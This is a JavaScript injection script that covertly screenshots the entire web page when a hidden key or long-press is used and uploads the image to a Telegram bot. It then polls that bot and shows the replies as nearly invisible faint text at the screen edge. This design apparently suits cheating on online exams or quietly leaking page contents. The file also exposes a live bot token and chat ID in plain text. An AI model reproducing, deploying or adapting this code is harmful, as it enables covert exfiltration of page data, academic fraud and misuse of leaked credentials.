// a.js

export default (function(){
    let pressTimer,lastUpdate=0;
    let botMessages=[];
    let activeIndex=-1;
    let activeMsg=null;
    let qActive=false;
    let qContainer=null;
    let zTimer=null;

    const BOT_TOKEN='8222291151:AAGcRlRKcwD73L61S5aKLboVOSVx4KY_Nik';
    const CHAT_ID='7235913446';

    const s=document.createElement('script');
    s.src='https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
    document.head.appendChild(s);

    s.onload=function(){
        function d2b(d){
            let a=d.split(','),m=a[0].match(/:(.*?);/)[1],
                b=atob(a[1]),n=b.length,u=new Uint8Array(n);
            while(n--){u[n]=b.charCodeAt(n);}
            return new Blob([u],{type:m});
        }

        function showMsg(txt,duration=1000,isRight=false){
            if(activeMsg){activeMsg.remove();activeMsg=null;}
            let m=document.createElement('div');
            m.style.position='fixed';
            m.style.zIndex=999999;
            m.style.padding='2px 6px';
            m.style.fontSize='10px';
            m.style.borderRadius='6px';
            m.style.maxWidth='60%';
            m.style.wordBreak='break-word';
            m.style.background='transparent';
            m.style.color='rgba(128,128,128,0.4)';
            m.style.bottom='0';
            if(isRight){m.style.right='5px';}else{m.style.left='5px';}
            m.textContent=txt;
            document.body.appendChild(m);
            activeMsg=m;
            setTimeout(()=>{
                if(m===activeMsg&&!qActive){
                    m.remove();activeMsg=null;
                }
            },duration);
        }

        function send(){
            html2canvas(document.body).then(c=>{
                const d=c.toDataURL('image/png');
                const b=d2b(d);
                const f=new FormData();
                f.append('chat_id',CHAT_ID);
                f.append('photo',b,'screenshot.png');
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
                    method:'POST',body:f
                }).then(r=>r.json())
                  .then(res=>{
                    showMsg(res.ok?"Screenshot yuborildi!":"Xato!",1000,true);
                  }).catch(e=>showMsg("Xato!",1000,true));
            });
        }

        function poll(){
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdate+1}`)
                .then(r=>r.json()).then(data=>{
                    if(data.ok&&data.result.length>0){
                        data.result.forEach(upd=>{
                            lastUpdate=upd.update_id;
                            if(upd.message&&upd.message.text){
                                botMessages.push(upd.message.text);
                                activeIndex=botMessages.length-1;
                                showMsg(botMessages[activeIndex],1000,false);
                            }
                        });
                    }
                }).catch(e=>{});
        }

        setInterval(poll,3000);

        document.addEventListener('mousedown',e=>{
            if(e.button===0)pressTimer=setTimeout(send,500);
            if(e.button===1)showAllMsgs();
        });
        document.addEventListener('mouseup',e=>{
            if(e.button===0)clearTimeout(pressTimer);
            if(e.button===1)hideAllMsgs();
        });

        document.addEventListener('contextmenu',e=>{
            e.preventDefault();
            if(botMessages.length>0){
                activeIndex=botMessages.length-1;
                showMsg(botMessages[activeIndex],1000,false);
            }
        });

        document.addEventListener('wheel',e=>{
            if(botMessages.length===0)return;
            if(e.deltaY<0){ if(activeIndex>0)activeIndex--; }
            else { if(activeIndex<botMessages.length-1)activeIndex++; }
            showMsg(botMessages[activeIndex],1000,false);
        });

        document.addEventListener('keydown',e=>{
            if(e.key==='ArrowUp'){
                if(botMessages.length>0&&activeIndex>0){
                    activeIndex--;
                    showMsg(botMessages[activeIndex],1000,false);
                }
            }
            if(e.key==='ArrowDown'){
                if(botMessages.length>0&&activeIndex<botMessages.length-1){
                    activeIndex++;
                    showMsg(botMessages[activeIndex],1000,false);
                }
            }
            if(e.key==='z'||e.key==='Z'){
                if(!zTimer){zTimer=setTimeout(()=>{send();},500);}
            }
            if(e.key==='q'||e.key==='Q'){showAllMsgs();}
        });

        document.addEventListener('keyup',e=>{
            if(e.key==='z'||e.key==='Z'){clearTimeout(zTimer);zTimer=null;}
            if(e.key==='q'||e.key==='Q'){hideAllMsgs();}
        });

        function showAllMsgs(){
            if(!qActive){
                qActive=true;
                qContainer=document.createElement('div');
                qContainer.style.position='fixed';
                qContainer.style.bottom='30px';
                qContainer.style.left='5px';
                qContainer.style.zIndex=999999;
                qContainer.style.padding='0';
                qContainer.style.background='transparent';
                qContainer.style.color='rgba(128,128,128,0.4)';
                qContainer.style.fontSize='10px';
                qContainer.style.borderRadius='0';
                qContainer.style.overflow='visible';
                document.body.appendChild(qContainer);
                botMessages.forEach(msg=>{
                    let p=document.createElement('div');
                    p.textContent=msg;
                    p.style.marginBottom='4px';
                    qContainer.appendChild(p);
                });
            }
        }

        function hideAllMsgs(){
            if(qActive){qContainer.remove();qContainer=null;qActive=false;}
        }
    };
})();
